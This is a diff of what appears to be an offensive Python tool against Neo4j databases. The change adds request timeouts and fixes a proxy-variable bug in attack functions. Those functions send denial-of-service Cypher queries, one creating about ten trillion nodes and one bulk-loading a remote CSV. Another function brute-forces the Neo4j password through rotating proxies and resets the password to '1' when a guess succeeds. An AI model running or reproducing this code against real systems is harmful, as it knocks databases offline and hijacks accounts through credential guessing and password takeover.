@@ -22,9 +22,9 @@ def banner():
      An analysis graph database tool
     """)
 def dos_RamCpu(ip,url_query,headers):
-    requests.post(url_query,json={'statements': [{'resultDataContents':['row'], 'statement':'FOREACH (x in range(1,10000000000000) | CREATE (:Person {name:"name"+x, age: x%100}));'}]},headers=headers).json()
+    requests.post(url_query,json={'statements': [{'resultDataContents':['row'], 'statement':'FOREACH (x in range(1,10000000000000) | CREATE (:Person {name:"name"+x, age: x%100}));'}]},headers=headers,timeout=60).json()
 def dos_disco2(ip,url_query,headers):
-    requests.post(url_query,json={'statements': [{'resultDataContents':['row'], 'statement':'USING PERIODIC COMMIT 1000 LOAD CSV FROM \"https://data.cityofchicago.org/api/views/ijzp-q8t2/rows.csv?accessType=DOWNLOAD\" AS row CREATE (A:NODO:NODO2:NODO3:NODO4 {a:row[0],b:row[1],c:row[3],d:row[4]})-[:RE]->(B:NODO5:NODO6:NODO7:NODO8 {zz:row[5],dd:row[6],qq:row[7],rr:row[8]});'}]},headers=headers).json()
+    requests.post(url_query,json={'statements': [{'resultDataContents':['row'], 'statement':'USING PERIODIC COMMIT 1000 LOAD CSV FROM \"https://data.cityofchicago.org/api/views/ijzp-q8t2/rows.csv?accessType=DOWNLOAD\" AS row CREATE (A:NODO:NODO2:NODO3:NODO4 {a:row[0],b:row[1],c:row[3],d:row[4]})-[:RE]->(B:NODO5:NODO6:NODO7:NODO8 {zz:row[5],dd:row[6],qq:row[7],rr:row[8]});'}]},headers=headers,timeout=10).json()
 def dos_disco1(ip,url_query,url_labels,url_props,headers):
 	l = []
 	g={}
@@ -38,13 +38,13 @@ def dos_disco1(ip,url_query,url_labels,url_props,headers):
 	g["statements"] = l
 	requests.post(url_query,json=g,headers=headers)
 
-def brutteForce_Neo4j(ip,dictpassw,proxies,headers):
+def brutteForce_Neo4j(ip,dictpassw,dictproxies,headers):
 	d = {}
 	url_changepassword = "http://"+ ip +":7474/user/neo4j/password"
 	data = '{"password":"1"}';
 	for i,passw in enumerate(dictpassw):
 		proxies = {
-  			'http': 'http://'+proxies[i%len(proxies)],
+  			'http': 'http://'+dictproxies[i%len(dictproxies)],
 		}
 		r_pass = requests.post(url_changepassword, data=data, headers=headers, auth=('neo4j', passw),timeout=0.1)
 		if (r_pass.status_code == 200):
